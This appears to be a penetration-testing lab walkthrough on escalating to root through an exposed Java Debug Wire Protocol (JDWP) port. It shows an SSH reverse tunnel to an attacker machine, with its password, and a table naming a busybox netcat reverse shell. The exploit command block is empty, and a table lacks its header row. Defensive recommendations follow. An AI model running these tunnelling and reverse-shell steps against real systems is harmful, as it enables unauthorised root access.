
## Overview

**JDWP**, or **Java Debug Wire Protocol**, is used for debugging Java applications.

If a Java process exposes JDWP without proper restrictions, an attacker who can reach the debug port may be able to execute code in the context of that Java process.

In this walkthrough, local enumeration found a root-owned Java process running with JDWP enabled on port `8000`.

Process:

```text
java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
```

Because the Java process was running as `root`, successful JDWP exploitation led to a root shell.

> [!important]
> JDWP is dangerous when exposed in production, especially when the debugged Java process runs as a privileged user.

|---|---|
| `-Xdebug` | Java debugging enabled |
| `-Xrunjdwp` | JDWP debug agent enabled |
| `transport=dt_socket` | Debugger listens over socket |
| `address=8000` | JDWP debug port |
| `server=y` | JVM listens for debugger connections |
| User `root` | Code execution through JDWP runs as root |

Why it matters:

```text
JDWP is exposed locally on the target.
The Java process is running as root.
If the debug port can be accessed, command execution may run as root.
```

# Accessing Local JDWP from Kali

The JDWP service was not directly accessed remotely from Kali in the walkthrough. Instead, SSH reverse port forwarding was used from the compromised target to Kali.

## SSH Reverse Port Forward

From target:

```bash
ssh -f -N -R 8000:localhost:8000 kali@192.168.45.187
```

Meaning:

| Option | Purpose |
|---|---|
| `-f` | Run SSH in background |
| `-N` | Do not execute remote command |
| `-R 8000:localhost:8000` | Expose target localhost port 8000 on Kali port 8000 |
| `kali@192.168.45.187` | SSH to attacker machine |

Plain English:

```text
make target's local JDWP port 8000 accessible on Kali as 127.0.0.1:8000
```

First connection may prompt for host key verification:

```text
Are you sure you want to continue connecting (yes/no/[fingerprint])?
```

Answer:

```text
yes
```

Then authenticate to Kali:

```text
kali@192.168.45.187's password: kali
```

# Running the JDWP Exploit

Exploit command:


Option meanings:

| Option | Meaning |
|---|---|
| `-t 127.0.0.1` | Target JDWP through forwarded local port on Kali |
| `-p 8000` | JDWP port |
| `--cmd` | Command to execute through JDWP |
| `busybox nc ... -e sh` | Reverse shell command |

# Decision Points

```text
If a Java process has -Xdebug and -Xrunjdwp:
    investigate JDWP exposure

If JDWP runs as root:
    treat as high-impact privilege escalation

If JDWP binds only locally:
    use port forwarding from the compromised host

If exploit waits for ServerSocket.accept:
    identify and connect to the associated listening service

If reverse shell does not connect:
    check listener, LHOST, LPORT, forwarding, and event trigger
```

# Defensive Notes

JDWP risk indicators:

```text
Java process launched with -Xdebug
Java process launched with -Xrunjdwp
JDWP listening on a socket
debug port exposed to users or network
debug process running as root
unauthenticated debugger access
```

Defensive recommendations:

```text
do not run JDWP in production
bind debug interfaces to localhost only when absolutely required
restrict debug ports with firewall rules
do not run debugged applications as root
monitor for Java processes with debug flags
monitor unexpected connections to JDWP ports
remove debug flags from service definitions
```

High-risk command-line pattern:

```text
-Xdebug -Xrunjdwp:transport=dt_socket,address=<port>,server=y
```

# Key Takeaways

- JDWP is a Java debugging protocol that can become a privilege escalation vector.
- The vulnerable process was running as `root`.
- The process exposed JDWP on port `8000`.
- The exploit used Exploit-DB `46501`.
- SSH reverse port forwarding made target-local JDWP accessible from Kali.
- The exploit waited for a Java `ServerSocket.accept` event.
- Connecting to port `5000` triggered the event.
- The command executed as the Java process owner.
- Because the Java process ran as root, the reverse shell returned as root.
